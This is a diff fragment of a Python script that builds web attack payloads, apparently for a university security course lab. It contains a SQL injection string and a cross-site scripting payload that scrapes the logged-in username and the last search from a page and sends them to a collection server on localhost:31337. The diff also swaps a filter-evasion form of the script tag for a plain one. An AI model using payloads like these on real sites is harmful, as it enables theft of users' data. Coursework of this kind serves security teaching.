@@ -8,7 +8,7 @@ injection = "'||1-- "
 import urllib.parse as parse
 
 html = """
-<scrscriptipt>
+<script>
     $.get("https://project2.ecen4133.org/search?xssdefense=0", function (data) {
         re = /<span id="logged-in-user">.*<\/span>/;
         var username = re.exec(data)[0].replace('<span id="logged-in-user">', '').replace('<\/span>', '');
@@ -16,7 +16,7 @@ html = """
         var last_search = re.exec(data)[0].replace(/<a href="search\?q=.*class="history-item list-group-item">/m, '').replace('<\/a>', '');
         $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
     });
-</scrscriptipt>
+</script>
 """
 
 html = """
